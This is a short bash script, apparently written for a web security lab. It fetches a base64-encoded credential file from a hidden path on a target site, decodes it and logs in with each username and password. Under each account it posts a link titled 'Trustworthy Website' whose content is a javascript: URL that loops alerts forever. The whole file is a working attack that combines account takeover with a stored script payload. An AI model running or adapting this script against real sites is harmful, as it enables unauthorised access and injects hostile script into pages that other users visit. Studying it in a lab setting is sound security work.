#!/bin/bash

POST_URL="${1}/post.php"
HIDDEN_FILE="${1}/docs/file"

curl -s ${HIDDEN_FILE} | base64 -D > decoded_file
echo "" >> decoded_file

while read line; do
    credentials=($line)
    
    username="${credentials[0]}"
    password="${credentials[1]}"
   
    echo "Attempting to log in as $username:$password"
    echo "form=login&submit=Login&username=${username}&password=${password}" | curl -d @- -c cookies ${POST_URL}
    curl -L -b cookies -s ${1} | awk '/Welcome, ([a-z]+)!/ { print $1 " " $2 }' 

    echo "Attempting to post a link..."
    echo "form=content&title=Trustworthy+Website&content=javascript%3Awhile%281%29alert%28%29&type=2" | curl -L -b cookies -d @- -s ${POST_URL} > /dev/null

    echo ""

done < decoded_file

rm decoded_file cookies
